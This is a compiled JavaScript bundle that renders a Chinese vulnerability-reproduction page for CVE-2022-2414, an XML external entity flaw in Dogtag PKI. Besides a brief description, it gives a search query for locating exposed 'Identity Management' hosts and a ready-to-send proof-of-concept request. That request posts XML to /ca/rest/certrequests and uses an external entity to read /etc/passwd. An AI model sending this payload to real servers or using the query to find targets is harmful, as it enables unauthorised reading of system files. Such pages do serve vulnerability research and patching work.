(window.webpackJsonp=window.webpackJsonp||[]).push([[444],{2058:function(s,t,a){s.exports=a.p+"assets/img/1666109777446-b643ca9b-dea3-4ac4-8bf0-8f34f1eec640.06e517d9.png"},2059:function(s,t,a){s.exports=a.p+"assets/img/1666110160561-329b89b1-2d6a-47a7-b026-45b0b7ef6670.465d1f38.png"},3145:function(s,t,a){"use strict";a.r(t);var r=a(64),e=Object(r.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"dogtag-pki-xml实体注入漏洞-cve-2022-2414"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#dogtag-pki-xml实体注入漏洞-cve-2022-2414"}},[s._v("#")]),s._v(" Dogtag PKI XML实体注入漏洞 CVE-2022-2414")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("Dogtag PKI 的XML解析器存在安全漏洞，该漏洞源于在分析 XML 文档时访问外部实体可能会导致 XML 外部实体 （XXE） 攻击。此漏洞允许远程攻击者通过发送特制的 HTTP 请求来潜在地检索任意文件的内容。")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Dogtag PKI")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v('title="Identity Management" ')]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("登录页面")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2058),alt:"img"}})]),s._v(" "),t("p",[s._v("验证POC")]),s._v(" "),t("div",{staticClass:"language-java line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-java"}},[t("code",[t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("ca"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("rest"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("certrequests\n"),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Content")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Type")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("xml\n\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("xml version"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1.0"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("DOCTYPE")]),s._v(" replace "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("ENTITY")]),s._v(" ent "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("SYSTEM")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"file:///etc/passwd"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token generics"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("CertEnrollmentRequest")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n  "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Attributes")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n  "),t("span",{pre:!0,attrs:{class:"token generics"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ProfileID")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("ent"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ProfileID")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("CertEnrollmentRequest")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br")])]),t("p",[t("img",{attrs:{src:a(2059),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=e.exports}}]);